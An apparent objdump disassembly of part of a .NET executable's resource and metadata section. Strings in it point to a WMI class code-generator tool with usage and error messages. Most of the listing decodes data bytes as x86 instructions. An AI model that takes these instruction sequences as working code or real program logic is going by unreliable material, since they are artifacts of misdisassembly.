  402d78:	adc    esi,DWORD PTR [eax]
  402d7a:	add    eax,DWORD PTR [eax]
  402d7c:	sbb    eax,0x6000000
  402d81:	add    BYTE PTR [eax],al
  402d83:	adc    DWORD PTR [eax],ebp
  402d85:	adc    al,BYTE PTR [eax]
  402d87:	add    BYTE PTR [esi],al
  402d89:	or     al,BYTE PTR [esi]
  402d8b:	sub    eax,0x62a1402
  402d90:	jnp    0x402e08
  402d92:	add    BYTE PTR [eax],al
  402d94:	add    al,0x2
  402d96:	sub    BYTE PTR [ebx],dl
  402d98:	add    BYTE PTR [eax],al
  402d9a:	push   es
  402d9b:	outs   dx,DWORD PTR ds:[esi]
  402d9c:	add    BYTE PTR es:[eax],al
  402d9f:	or     ch,BYTE PTR [edx]
  402da1:	sub    al,BYTE PTR [ebx]
  402da3:	push   ss
  402da4:	push   edx
  402da5:	add    ch,BYTE PTR [eax]
  402da7:	push   ss
  402da8:	add    BYTE PTR [eax],al
  402daa:	push   es
  402dab:	sub    dl,BYTE PTR [ebx]
  402dad:	xor    BYTE PTR [ebx],al
  402daf:	add    BYTE PTR ds:0x6000000,bl
  402db5:	add    BYTE PTR [eax],al
  402db7:	adc    DWORD PTR [eax],ebp
  402db9:	adc    al,BYTE PTR [eax]
  402dbb:	add    BYTE PTR [esi],al
  402dbd:	or     al,BYTE PTR [esi]
  402dbf:	sub    eax,0x62a1402
  402dc4:	jnp    0x402e3c
  402dc6:	add    BYTE PTR [eax],al
  402dc8:	add    al,0x2
  402dca:	sub    BYTE PTR [ebx],dl
  402dcc:	add    BYTE PTR [eax],al
  402dce:	push   es
  402dcf:	outs   dx,DWORD PTR ds:[esi]
  402dd0:	pop    ebx
  402dd1:	add    BYTE PTR [eax],al
  402dd3:	or     ch,BYTE PTR [edx]
  402dd5:	push   es
  402dd6:	sub    al,BYTE PTR [eax]
  402dd8:	fild   DWORD PTR [edi]
  402dda:	add    BYTE PTR [eax],al
  402ddc:	into   
  402ddd:	retf   0xbeef
  402de0:	add    DWORD PTR [eax],eax
  402de2:	add    BYTE PTR [eax],al
  402de4:	xchg   ecx,eax
  402de5:	add    BYTE PTR [eax],al
  402de7:	add    BYTE PTR [ebx+edx*2+0x79],ch
  402deb:	jae    0x402e61
  402ded:	gs ins DWORD PTR es:[edi],dx
  402def:	cs push edx
  402df1:	gs jae 0x402e63
  402df4:	jne    0x402e68
  402df6:	arpl   WORD PTR [ebp+0x73],sp
  402df9:	cs push edx
  402dfb:	gs jae 0x402e6d
  402dfe:	jne    0x402e72
  402e00:	arpl   WORD PTR [ebp+0x52],sp
  402e03:	gs popa 
  402e05:	fs gs jb 0x402e35
  402e09:	and    BYTE PTR [ebp+0x73],ch
  402e0c:	arpl   WORD PTR [edi+0x72],bp
  402e0f:	ins    BYTE PTR es:[edi],dx
  402e10:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  402e17:	jae    0x402e82
  402e19:	outs   dx,DWORD PTR ds:[esi]
  402e1a:	outs   dx,BYTE PTR ds:[esi]
  402e1b:	cmp    eax,0x2e302e34
  402e20:	xor    BYTE PTR [esi],ch
  402e22:	xor    BYTE PTR [eax+eiz*1],ch
  402e25:	inc    ebx
  402e26:	jne    0x402e94
  402e28:	je     0x402e9f
  402e2a:	jb     0x402e91
  402e2c:	cmp    eax,0x7475656e
  402e31:	jb     0x402e94
  402e33:	ins    BYTE PTR es:[edi],dx
  402e34:	sub    al,0x20
  402e36:	push   eax
  402e37:	jne    0x402e9b
  402e39:	ins    BYTE PTR es:[edi],dx
  402e3a:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  402e41:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  402e45:	bound  esi,QWORD PTR [edi]
  402e47:	aaa    
  402e48:	popa   
  402e49:	xor    eax,0x31363563
  402e4e:	cmp    DWORD PTR [ebx],esi
  402e50:	xor    al,0x65
  402e52:	xor    BYTE PTR [eax],bh
  402e54:	cmp    DWORD PTR [ebx],esp
  402e56:	push   ebx
  402e57:	jns    0x402ecc
  402e59:	je     0x402ec0
  402e5b:	ins    DWORD PTR es:[edi],dx
  402e5c:	cs push edx
  402e5e:	gs jae 0x402ed0
  402e61:	jne    0x402ed5
  402e63:	arpl   WORD PTR [ebp+0x73],sp
  402e66:	cs push edx
  402e68:	jne    0x402ed8
  402e6a:	je     0x402ed5
  402e6c:	ins    DWORD PTR es:[edi],dx
  402e6d:	gs push edx
  402e6f:	gs jae 0x402ee1
  402e72:	jne    0x402ee6
  402e74:	arpl   WORD PTR [ebp+0x53],sp
  402e77:	gs je  0x402e7c
  402e7a:	add    BYTE PTR [eax],al
  402e7c:	add    BYTE PTR [ebx],bl
  402e7e:	add    BYTE PTR [eax],al
  402e80:	add    BYTE PTR [eax],al
  402e82:	add    BYTE PTR [eax],al
  402e84:	add    BYTE PTR [eax+0x41],dl
  402e87:	inc    esp
  402e88:	push   eax
  402e89:	inc    ecx
  402e8a:	inc    esp
  402e8b:	push   eax
  402e8c:	loop   0x402ef4
  402e8e:	int    0x82
  402e90:	or     BYTE PTR [edx+0x623196c0],dl
  402e96:	ret    
  402e97:	mov    dl,0x2e
  402e99:	and    bl,BYTE PTR [esi+edi*4-0x19]
  402e9d:	xor    BYTE PTR [ebp+ecx*8-0x2d8a5acb],0x48
  402ea5:	pop    ss
  402ea6:	sbb    ch,0x23
  402ea9:	jo     0x402e43
  402eab:	fnstsw WORD PTR [edi]
  402ead:	retf   
  402eae:	or     esp,ebp
  402eb0:	rcr    ebp,0x5a
  402eb3:	out    dx,eax
  402eb4:	in     eax,dx
  402eb5:	iret   
  402eb6:	cdq    
  402eb7:	adc    DWORD PTR [ebp+0x7512f94a],eax
  402ebd:	mov    DWORD PTR [esi+edx*1+0x7d],0xf71ffa04
  402ec5:	and    bl,BYTE PTR [ebp+0x23]
  402ec8:	cmc    
  402ec9:	arpl   si,ax
  402ecb:	sub    bh,BYTE PTR [edi+0x602fb2d3]
  402ed1:	stos   DWORD PTR es:[edi],eax
  402ed2:	cmp    edi,DWORD PTR [edi]
  402ed4:	or     eax,0x1b3f696d
  402ed9:	sub    DWORD PTR [edi],ebp
  402edb:	inc    esi
  402edc:	cmovae ebx,DWORD PTR [eax-0x2a652ea9]
  402ee3:	pop    esp
  402ee4:	call   0xddfb:0xb85d876f
  402eeb:	ins    BYTE PTR es:[edi],dx
  402eec:	cmc    
  402eed:	and    ebp,DWORD PTR [esi]
  402eef:	jne    0x402eee
  402ef1:	and    esi,DWORD PTR [esi+0x73f15475]
  402ef7:	jl     0x402eea
  402ef9:	add    BYTE PTR [eax],al
  402efb:	add    bh,cl
  402efd:	add    DWORD PTR [eax],eax
  402eff:	add    BYTE PTR [ecx+eax*1],bl
  402f02:	add    BYTE PTR [eax],al
  402f04:	rol    DWORD PTR [eax],0x0
  402f07:	add    BYTE PTR [eax+eax*1+0x0],bh
  402f0b:	add    BYTE PTR [edx+eax*1+0x1d0000],bl
  402f12:	add    BYTE PTR [eax],al
  402f14:	add    BYTE PTR [eax],al
  402f16:	add    BYTE PTR [eax],al
  402f18:	xor    DWORD PTR [edx],eax
  402f1a:	add    BYTE PTR [eax],al
  402f1c:	arpl   WORD PTR [eax],ax
  402f1e:	add    BYTE PTR [eax],al
  402f20:	scas   al,BYTE PTR es:[edi]
  402f21:	add    BYTE PTR [eax],al
  402f23:	add    BYTE PTR ds:0x54000001,dh
  402f29:	add    DWORD PTR [eax],eax
  402f2b:	add    BYTE PTR [eax],bl
  402f2d:	add    al,BYTE PTR [eax]
  402f2f:	add    BYTE PTR [ebp+0x1],dh
  402f32:	add    BYTE PTR [eax],al
  402f34:	lock add DWORD PTR [eax],eax
  402f37:	add    BYTE PTR [eax+0x2],bh
  402f3a:	add    BYTE PTR [eax],al
  402f3c:	stos   DWORD PTR es:[edi],eax
  402f3d:	add    DWORD PTR [eax],eax
  402f3f:	add    BYTE PTR [esi],bh
  402f41:	add    BYTE PTR [eax],al
  402f43:	add    dh,dl
  402f45:	add    BYTE PTR [eax],al
  402f47:	add    BYTE PTR [esi-0x62ffffff],bh
  402f4d:	add    BYTE PTR [eax],al
  402f4f:	add    BYTE PTR [ebx],al
  402f51:	add    al,BYTE PTR [eax]
  402f53:	add    BYTE PTR [edx+0x67000001],bl
  402f59:	add    al,BYTE PTR [eax]
  402f5b:	add    BYTE PTR [ebx+0x5a000002],cl
  402f61:	add    al,BYTE PTR [eax]
  402f63:	add    BYTE PTR [ebp+0x4],al
  402f66:	add    BYTE PTR [eax],al
  402f68:	sbb    BYTE PTR [eax+0x0],dl
  402f6b:	popa   
  402f6c:	add    BYTE PTR [ebx+0x0],dh
  402f6f:	jae    0x402f71
  402f71:	ja     0x402f73
  402f73:	add    BYTE PTR fs:[eax+0x0],dl
  402f77:	jb     0x402f79
  402f79:	outs   dx,DWORD PTR ds:[esi]
  402f7a:	add    BYTE PTR [ebp+0x0],ch
  402f7d:	jo     0x402f7f
  402f7f:	je     0x402f81
  402f81:	add    BYTE PTR [eax],al
  402f83:	add    BYTE PTR [eax],al
  402f85:	sbb    al,0x63
  402f87:	add    BYTE PTR [eax+eax*1+0x61],ch
  402f8b:	add    BYTE PTR [ebx+0x0],dh
  402f8e:	jae    0x402f90
  402f90:	dec    esi
  402f91:	add    BYTE PTR [ecx+0x0],ah
  402f94:	ins    DWORD PTR es:[edi],dx
  402f95:	add    BYTE PTR [ebp+0x0],ah
  402f98:	push   ebx
  402f99:	add    BYTE PTR [eax+0x0],dh
  402f9c:	popa   
  402f9d:	add    BYTE PTR [ebx+0x0],ah
  402fa0:	add    BYTE PTR gs:[eax],ah
  402fa3:	add    BYTE PTR [eax],al
  402fa5:	add    BYTE PTR [eax],ah
  402fa7:	arpl   WORD PTR [eax],ax
  402fa9:	ins    BYTE PTR es:[edi],dx
  402faa:	add    BYTE PTR [ecx+0x0],ah
  402fad:	jae    0x402faf
  402faf:	jae    0x402fb1
  402fb1:	dec    esi
  402fb2:	add    BYTE PTR [edi+0x0],ch
  402fb5:	je     0x402fb7
  402fb7:	inc    esi
  402fb8:	add    BYTE PTR [edi+0x0],ch
  402fbb:	jne    0x402fbd
  402fbd:	outs   dx,BYTE PTR ds:[esi]
  402fbe:	add    BYTE PTR [eax+eax*1+0x45],ah
  402fc2:	add    BYTE PTR [edx+0x0],dh
  402fc5:	jb     0x402fc7
  402fc7:	push   0x0
  402fc9:	add    BYTE PTR [eax],al
  402fcb:	adc    al,0x63
  402fcd:	add    BYTE PTR [edi+0x0],ch
  402fd0:	add    BYTE PTR fs:[ebp+0x0],ah
  402fd4:	inc    edi
  402fd5:	add    BYTE PTR [ebp+0x0],ah
  402fd8:	outs   dx,BYTE PTR ds:[esi]
  402fd9:	add    BYTE PTR [ebp+0x0],al
  402fdc:	jb     0x402fde
  402fde:	jb     0x402fe0
  402fe0:	mov    al,BYTE PTR [eax]
  402fe2:	add    BYTE PTR [eax],al
  402fe4:	sbb    al,0x63
  402fe6:	add    BYTE PTR [edi+0x0],ch
  402fe9:	add    BYTE PTR fs:[ebp+0x0],ah
  402fed:	inc    edi
  402fee:	add    BYTE PTR [ebp+0x0],ah
  402ff1:	outs   dx,BYTE PTR ds:[esi]
  402ff2:	add    BYTE PTR [ebx+0x0],dl
  402ff5:	jne    0x402ff7
  402ff7:	arpl   WORD PTR [eax],ax
  402ff9:	arpl   WORD PTR [eax],ax
  402ffb:	add    BYTE PTR gs:[ebx+0x0],dh
  402fff:	jae    0x403001
  403001:	mov    ds:0xc000000,eax
  403006:	arpl   WORD PTR [eax],ax
  403008:	jae    0x40300a
  40300a:	dec    esp
  40300b:	add    BYTE PTR [ecx+0x0],ah
  40300e:	outs   dx,BYTE PTR ds:[esi]
  40300f:	add    BYTE PTR [edi+0x0],ah
  403012:	les    eax,FWORD PTR [eax]
  403014:	add    BYTE PTR [eax],al
  403016:	push   cs
  403017:	add    BYTE PTR gs:[eax+0x0],bh
  40301b:	popa   
  40301c:	add    BYTE PTR [ebp+0x0],ch
  40301f:	jo     0x403021
  403021:	ins    BYTE PTR es:[edi],dx
  403022:	add    BYTE PTR [ebp+0x0],ah
  403025:	fadd   QWORD PTR [eax]
  403027:	add    BYTE PTR [eax],al
  403029:	adc    BYTE PTR [esi+0x0],ah
  40302c:	imul   eax,DWORD PTR [eax],0x65006c
  403032:	push   eax
  403033:	add    BYTE PTR [ecx+0x0],ah
  403036:	je     0x403038
  403038:	push   0xe700
  40303d:	add    BYTE PTR [esi],dl
  40303f:	add    BYTE PTR [di+0x0],ah
  403043:	outs   dx,BYTE PTR ds:[esi]
  403044:	add    BYTE PTR [eax+eax*1+0x61],cl
  403048:	add    BYTE PTR [esi+0x0],ch
  40304b:	add    BYTE PTR [di+0x0],dh
  40304f:	popa   
  403050:	add    BYTE PTR [edi+0x0],ah
  403053:	add    BYTE PTR gs:[edi],cl
  403056:	add    DWORD PTR [eax],eax
  403058:	add    BYTE PTR [esi],ah
  40305a:	add    BYTE PTR [di+0x0],ah
  40305e:	outs   dx,BYTE PTR ds:[esi]
  40305f:	add    BYTE PTR [ebp+0x0],ah
  403062:	jb     0x403064
  403064:	popa   
  403065:	add    BYTE PTR [eax+eax*1+0x69],dh
  403069:	add    BYTE PTR [esi+0x0],ch
  40306c:	add    BYTE PTR [bp+di+0x0],al
  403070:	ins    BYTE PTR es:[edi],dx
  403071:	add    BYTE PTR [ecx+0x0],ah
  403074:	jae    0x403076
  403076:	jae    0x403078
  403078:	dec    esi
  403079:	add    BYTE PTR [ecx+0x0],ah
  40307c:	ins    DWORD PTR es:[edi],dx
  40307d:	add    BYTE PTR [ebp+0x0],ah
  403080:	push   edx
  403081:	add    DWORD PTR [eax],eax
  403083:	add    BYTE PTR [edi+eiz*2],dl
  403086:	add    BYTE PTR [ebp+0x0],ah
  403089:	outs   dx,BYTE PTR ds:[esi]
  40308a:	add    BYTE PTR [ebp+0x0],ah
  40308d:	jb     0x40308f
  40308f:	imul   eax,DWORD PTR [eax],0x450063
  403095:	jb     0x403097
  403097:	jb     0x403099
  403099:	jno    0x40309c
  40309b:	add    BYTE PTR [eax],al
  40309d:	sbb    ch,BYTE PTR [ecx+0x0]
  4030a0:	outs   dx,BYTE PTR ds:[esi]
  4030a1:	add    BYTE PTR [esi+0x0],dh
  4030a4:	popa   
  4030a5:	add    BYTE PTR [eax+eax*1+0x69],ch
  4030a9:	add    BYTE PTR [eax+eax*1+0x41],ah
  4030ad:	add    BYTE PTR [edx+0x0],dh
  4030b0:	add    BYTE PTR [di+0x0],al
  4030b4:	jb     0x4030b6
  4030b6:	jb     0x4030b8
  4030b8:	pop    DWORD PTR [ecx]
  4030ba:	add    BYTE PTR [eax],al
  4030bc:	sbb    al,0x69
  4030be:	add    BYTE PTR [esi+0x0],ch
  4030c1:	jbe    0x4030c3
  4030c3:	popa   
  4030c4:	add    BYTE PTR [eax+eax*1+0x69],ch
  4030c8:	add    BYTE PTR [eax+eax*1+0x4c],ah
  4030cc:	add    BYTE PTR [ecx+0x0],ah
  4030cf:	outs   dx,BYTE PTR ds:[esi]
  4030d0:	add    BYTE PTR [edi+0x0],ah
  4030d3:	inc    ebp
  4030d4:	add    BYTE PTR [edx+0x0],dh
  4030d7:	jb     0x4030d9
  4030d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030da:	add    DWORD PTR [eax],eax
  4030dc:	add    BYTE PTR [eax],ah
  4030de:	imul   eax,DWORD PTR [eax],0x76006e
  4030e4:	popa   
  4030e5:	add    BYTE PTR [eax+eax*1+0x69],ch
  4030e9:	add    BYTE PTR [eax+eax*1+0x4e],ah
  4030ed:	add    BYTE PTR [ecx+0x0],ah
  4030f0:	ins    DWORD PTR es:[edi],dx
  4030f1:	add    BYTE PTR [ebp+0x0],ah
  4030f4:	jae    0x4030f6
  4030f6:	jo     0x4030f8
  4030f8:	popa   
  4030f9:	add    BYTE PTR [ebx+0x0],ah
  4030fc:	gs add al,al
  4030ff:	add    DWORD PTR [eax],eax
  403101:	add    BYTE PTR [edx+ebp*2],cl
  403104:	add    BYTE PTR [ebx+0x0],dh
  403107:	dec    esp
  403108:	add    BYTE PTR [ecx+0x0],ah
  40310b:	outs   dx,BYTE PTR ds:[esi]
  40310c:	add    BYTE PTR [edi+0x0],ah
  40310f:	fld    DWORD PTR [ecx]
  403111:	add    BYTE PTR [eax],al
  403113:	push   cs
  403114:	ins    DWORD PTR es:[edi],dx
  403115:	add    BYTE PTR [ecx+0x0],ah
  403118:	arpl   WORD PTR [eax],ax
  40311a:	push   0x6e006900
  40311f:	add    BYTE PTR [ebp+0x0],ah
  403122:	out    dx,al
  403123:	add    DWORD PTR [eax],eax
  403125:	add    BYTE PTR [ebp*2+0x4c006300],cl
  40312c:	add    BYTE PTR [ecx+0x0],ah
  40312f:	outs   dx,BYTE PTR ds:[esi]
  403130:	add    BYTE PTR [edi+0x0],ah
  403133:	add    al,BYTE PTR ds:[eax]
  403136:	add    BYTE PTR [esi+ebp*2],bl
  403139:	add    BYTE PTR [edi+0x0],ch
  40313c:	inc    ebx
  40313d:	add    BYTE PTR [eax+eax*1+0x61],ch
  403141:	add    BYTE PTR [ebx+0x0],dh
  403144:	jae    0x403146
  403146:	dec    esi
  403147:	add    BYTE PTR [ecx+0x0],ah
  40314a:	ins    DWORD PTR es:[edi],dx
  40314b:	add    BYTE PTR [ebp+0x0],ah
  40314e:	inc    ebp
  40314f:	add    BYTE PTR [edx+0x0],dh
  403152:	jb     0x403154
  403154:	pop    eax
  403155:	add    al,BYTE PTR [eax]
  403157:	add    BYTE PTR [esi],cl
  403159:	outs   dx,DWORD PTR ds:[esi]
  40315a:	add    BYTE PTR [eax+0x0],dh
  40315d:	je     0x40315f
  40315f:	imul   eax,DWORD PTR [eax],0x6e006f
  403165:	jae    0x403167
  403167:	xchg   DWORD PTR [edx],eax
  403169:	add    BYTE PTR [eax],al
  40316b:	adc    BYTE PTR [eax+0x0],dh
  40316e:	popa   
  40316f:	add    BYTE PTR [ebx+0x0],dh
  403172:	jae    0x403174
  403174:	ja     0x403176
  403176:	outs   dx,DWORD PTR ds:[esi]
  403177:	add    BYTE PTR [edx+0x0],dh
  40317a:	add    BYTE PTR fs:[eax+0x14000002],dl
  403181:	jae    0x403183
  403183:	jns    0x403185
  403185:	outs   dx,BYTE PTR ds:[esi]
  403186:	add    BYTE PTR [eax+eax*1+0x61],dh
  40318a:	add    BYTE PTR [eax+0x0],bh
  40318d:	dec    eax
  40318e:	add    BYTE PTR [ebp+0x0],ah
  403191:	ins    BYTE PTR es:[edi],dx
  403192:	add    BYTE PTR [eax+0x0],dh
  403195:	scas   eax,DWORD PTR es:[edi]
  403196:	add    al,BYTE PTR [eax]
  403198:	add    BYTE PTR [esp+esi*2],ah
  40319b:	add    BYTE PTR [edi+0x0],ch
  40319e:	outs   dx,DWORD PTR ds:[esi]
  40319f:	add    BYTE PTR [eax+eax*1+0x6f],cl
  4031a3:	add    BYTE PTR [esi+0x0],ch
  4031a6:	add    BYTE PTR [bp+0x0],al
  4031aa:	imul   eax,DWORD PTR [eax],0x65006c
  4031b0:	dec    esi
  4031b1:	add    BYTE PTR [ecx+0x0],ah
  4031b4:	ins    DWORD PTR es:[edi],dx
  4031b5:	add    BYTE PTR [ebp+0x0],ah
  4031b8:	inc    ebp
  4031b9:	add    BYTE PTR [edx+0x0],dh
  4031bc:	jb     0x4031be
  4031be:	(bad)  
  4031bf:	add    al,BYTE PTR [eax]
  4031c1:	add    BYTE PTR [eax],cl
  4031c3:	jne    0x4031c5
  4031c5:	jae    0x4031c7
  4031c7:	add    BYTE PTR gs:[edx+0x0],dh
  4031cb:	jmp    0x76:0xc000002
  4031d2:	bound  eax,QWORD PTR [eax]
  4031d4:	dec    esp
  4031d5:	add    BYTE PTR [ecx+0x0],ah
  4031d8:	outs   dx,BYTE PTR ds:[esi]
  4031d9:	add    BYTE PTR [edi+0x0],ah
  4031dc:	pop    es
  4031dd:	add    eax,DWORD PTR [eax]
  4031df:	add    BYTE PTR [esi],cl
  4031e1:	jbe    0x4031e3
  4031e3:	add    BYTE PTR gs:[edx+0x0],dh
  4031e7:	jae    0x4031e9
  4031e9:	imul   eax,DWORD PTR [eax],0x6e006f
  4031ef:	and    DWORD PTR [ebx],eax
  4031f1:	add    BYTE PTR [eax],al
  4031f3:	or     al,0x76
  4031f5:	add    BYTE PTR [edx+0x0],ch
  4031f8:	dec    esp
  4031f9:	add    BYTE PTR [ecx+0x0],ah
  4031fc:	outs   dx,BYTE PTR ds:[esi]
  4031fd:	add    BYTE PTR [edi+0x0],ah
  403200:	sub    al,BYTE PTR [ebx]
  403202:	add    BYTE PTR [eax],al
  403204:	sbb    BYTE PTR [edi+0x0],dh
  403207:	ins    DWORD PTR es:[edi],dx
  403208:	add    BYTE PTR [ecx+0x0],ch
  40320b:	dec    esi
  40320c:	add    BYTE PTR [ecx+0x0],ah
  40320f:	ins    DWORD PTR es:[edi],dx
  403210:	add    BYTE PTR [ebp+0x0],ah
  403213:	push   ebx
  403214:	add    BYTE PTR [eax+0x0],dh
  403217:	popa   
  403218:	add    BYTE PTR [ebx+0x0],ah
  40321b:	add    BYTE PTR gs:[edx+0x3],al
  40321f:	add    BYTE PTR [eax],al
  403221:	add    DWORD PTR [esi],ebx
  403223:	inc    ebp
  403224:	outs   dx,BYTE PTR ds:[esi]
  403225:	je     0x40328c
  403227:	jb     0x403249
  403229:	je     0x403293
  40322b:	and    BYTE PTR gs:[eax+0x61],dh
  40322f:	jae    0x4032a4
  403231:	ja     0x4032a2
  403233:	jb     0x403299
  403235:	and    BYTE PTR [esi+0x6f],ah
  403238:	jb     0x40325a
  40323a:	daa    
  40323b:	jnp    0x40326d
  40323d:	jge    0x403266
  40323f:	and    BYTE PTR [edx],bh
  403241:	add    DWORD PTR [eax+0x9],ecx
  403244:	and    BYTE PTR [edi],ch
  403246:	dec    edi
  403247:	and    BYTE PTR [ebx+eax*2],bh
  40324a:	ins    BYTE PTR es:[edi],dx
  40324b:	popa   
  40324c:	jae    0x4032c1
  40324e:	dec    esi
  40324f:	popa   
  403250:	ins    DWORD PTR es:[edi],dx
  403251:	gs jae 0x4032c4
  403254:	popa   
  403255:	arpl   WORD PTR [ebp+0x3e],sp
  403258:	and    BYTE PTR [ecx],cl
  40325a:	and    BYTE PTR [ecx],cl
  40325c:	and    BYTE PTR [esi],ch
  40325e:	dec    esi
  40325f:	inc    ebp
  403260:	push   esp
  403261:	and    BYTE PTR [esi+0x61],ch
  403264:	ins    DWORD PTR es:[edi],dx
  403265:	gs jae 0x4032d8
  403268:	popa   
  403269:	arpl   WORD PTR [ebp+0x20],sp
  40326c:	imul   ebp,DWORD PTR [esi+0x20],0x63696877
  403273:	push   0x65687420
  403278:	and    BYTE PTR [ebx+0x6c],ah
  40327b:	popa   
  40327c:	jae    0x4032f1
  40327e:	and    BYTE PTR [ecx+0x73],ch
  403281:	and    BYTE PTR [edi+0x65],ah
  403284:	outs   dx,BYTE PTR ds:[esi]
  403285:	gs jb  0x4032e9
  403288:	je     0x4032ef
  40328a:	add    DWORD PTR fs:[esi],ebx
  40328d:	inc    edi
  40328e:	gs je  0x403305
  403291:	imul   ebp,DWORD PTR [esi+0x67],0x65687420
  403298:	and    BYTE PTR [edi+0x69],ah
  40329b:	jbe    0x403302
  40329d:	outs   dx,BYTE PTR ds:[esi]
  40329e:	and    BYTE PTR [ebx+0x6c],ah
  4032a1:	popa   
  4032a2:	jae    0x403317
  4032a4:	and    BYTE PTR [esi+0x61],al
  4032a7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x6f431701
  4032af:	fs and BYTE PTR gs:[edi+0x65],al
  4032b4:	outs   dx,BYTE PTR ds:[esi]
  4032b5:	gs jb  0x403319
  4032b8:	je     0x403323
  4032ba:	outs   dx,DWORD PTR ds:[esi]
  4032bb:	outs   dx,BYTE PTR ds:[esi]
  4032bc:	and    BYTE PTR [esi+0x61],al
  4032bf:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x431f012e
  4032c7:	outs   dx,DWORD PTR ds:[esi]
  4032c8:	fs and BYTE PTR gs:[edi+0x65],al
  4032cd:	outs   dx,BYTE PTR ds:[esi]
  4032ce:	gs jb  0x403332
  4032d1:	je     0x403338
  4032d3:	and    BYTE PTR fs:[ebx+0x75],dl
  4032d7:	arpl   WORD PTR [ebx+0x65],sp
  4032da:	jae    0x40334f
  4032dc:	data16 jne 0x40334b
  4032df:	ins    BYTE PTR es:[edi],dx
  4032e0:	jns    0x403303
  4032e2:	and    DWORD PTR [ecx],esp
  4032e4:	and    DWORD PTR [ecx],eax
  4032e6:	push   ss
  4032e7:	or     DWORD PTR [ecx],ecx
  4032e9:	or     DWORD PTR [ecx],ecx
  4032eb:	or     DWORD PTR [ecx],ecx
  4032ed:	and    BYTE PTR [ebx+0x53],al
  4032f0:	and    BYTE PTR ds:0x68534320,ch
  4032f6:	popa   
  4032f7:	jb     0x403369
  4032f9:	sub    BYTE PTR [ebx+0x23],al
  4032fc:	sub    DWORD PTR [ecx],eax
  4032fe:	or     DWORD PTR [ebp+0x78],eax
  403301:	popa   
  403302:	ins    DWORD PTR es:[edi],dx
  403303:	jo     0x403371
  403305:	and    BYTE PTR gs:[edx],bh
  403308:	add    DWORD PTR [esi],esp
  40330a:	or     DWORD PTR [eax],esp
  40330c:	das    
  40330d:	push   eax
  40330e:	and    BYTE PTR [esi+eax*2],bh
  403311:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x3e687461
  403319:	and    BYTE PTR [ecx],cl
  40331b:	and    BYTE PTR [ecx],cl
  40331d:	and    BYTE PTR [ecx],cl
  40331f:	and    BYTE PTR [edi+0x75],cl
  403322:	je     0x403394
  403324:	jne    0x40339a
  403326:	and    BYTE PTR [esi+0x69],ah
  403329:	ins    BYTE PTR es:[edi],dx
  40332a:	and    BYTE PTR gs:[eax+0x61],dh
  40332e:	je     0x403398
  403330:	add    DWORD PTR [ecx+0x9],eax
  403333:	and    BYTE PTR [edi],ch
  403335:	dec    esp
  403336:	and    BYTE PTR [edi+eax*2],bh
  403339:	outs   dx,BYTE PTR gs:[esi]
  40333b:	gs jb  0x40339f
  40333e:	je     0x4033a5
  403340:	and    BYTE PTR fs:[ecx+eiz*2+0x6e],cl
  403345:	addr16 jne 0x4033a9
  403348:	gs and BYTE PTR ds:[bx+di],cl
  40334d:	and    BYTE PTR [edi+0x6e],cl
  403350:	and    BYTE PTR gs:[edi+0x66],ch
  403354:	and    BYTE PTR [eax+ebp*2+0x65],dh
  403358:	and    BYTE PTR [esi+0x6f],ah
  40335b:	ins    BYTE PTR es:[edi],dx
  40335c:	ins    BYTE PTR es:[edi],dx
  40335d:	outs   dx,DWORD PTR ds:[esi]
  40335e:	ja     0x4033c9
  403360:	outs   dx,BYTE PTR ds:[esi]
  403361:	and    BYTE PTR cs:[si+0x65],al
  403366:	popaw  
  403368:	jne    0x4033d6
  40336a:	je     0x4033d1
  40336c:	and    BYTE PTR fs:[edi+ebp*2+0x20],dh
  403371:	inc    ebx
  403372:	push   ebx
  403373:	add    DWORD PTR ds:0x656e6547,ebx
  403379:	jb     0x4033dc
  40337b:	je     0x4033e6
  40337d:	outs   dx,BYTE PTR ds:[esi]
  40337e:	and    BYTE PTR [bp+di+0x6f],al
  403382:	fs and BYTE PTR gs:[esi+0x6f],ah
  403387:	jb     0x4033a9
  403389:	push   edi
  40338a:	dec    ebp
  40338b:	dec    ecx
  40338c:	and    BYTE PTR [ebx+0x6c],al
  40338f:	popa   
  403390:	jae    0x403405
  403392:	add    DWORD PTR [eax*2+0x726f7272],ebx
  403399:	jae    0x4033bb
  40339b:	dec    edi
  40339c:	arpl   WORD PTR [ebx+0x75],sp
  40339f:	jb     0x403413
  4033a1:	gs and DWORD PTR fs:[ecx],esp
  4033a5:	and    DWORD PTR [ecx],esp
  4033a7:	and    BYTE PTR [edx+0x65],dl
  4033aa:	popa   
  4033ab:	jae    0x40341c
  4033ad:	outs   dx,BYTE PTR ds:[esi]
  4033ae:	and    BYTE PTR [edx],bh
  4033b0:	add    DWORD PTR ds:0x61766e49,edx
  4033b6:	ins    BYTE PTR es:[edi],dx
  4033b7:	imul   esp,DWORD PTR [eax+eiz*1+0x41],0x6d756772
  4033bf:	outs   dx,BYTE PTR gs:[esi]
  4033c1:	je     0x403436
  4033c3:	and    BYTE PTR [ecx],ah
  4033c5:	and    DWORD PTR [ecx],esp
  4033c7:	add    DWORD PTR [eax],ebx
  4033c9:	inc    ebp
  4033ca:	jb     0x40343e
  4033cc:	outs   dx,DWORD PTR ds:[esi]
  4033cd:	jb     0x4033ef
  4033cf:	cmp    ah,BYTE PTR [eax]
  4033d1:	dec    ecx
  4033d2:	outs   dx,BYTE PTR ds:[esi]
  4033d3:	jbe    0x403436
  4033d5:	ins    BYTE PTR es:[edi],dx
  4033d6:	imul   esp,DWORD PTR [eax+eiz*1+0x4c],0x75676e61
  4033de:	popa   
  4033df:	add    DWORD PTR gs:[bx],edx
  4033e3:	dec    ecx
  4033e4:	outs   dx,BYTE PTR ds:[esi]
  4033e5:	jbe    0x403448
  4033e7:	ins    BYTE PTR es:[edi],dx
  4033e8:	imul   esp,DWORD PTR [eax+eiz*1+0x57],0x4e20494d
  4033f0:	popa   
  4033f1:	ins    DWORD PTR es:[edi],dx
  4033f2:	gs jae 0x403465
  4033f5:	popa   
  4033f6:	arpl   WORD PTR [ebp+0x20],sp
  4033f9:	cmp    al,BYTE PTR [ecx]
  4033fb:	adc    ecx,DWORD PTR [ecx]
  4033fd:	or     DWORD PTR [ecx],ecx
  4033ff:	or     DWORD PTR [ecx],ecx
  403401:	or     DWORD PTR [eax],esp
  403403:	dec    edx
  403404:	push   ebx
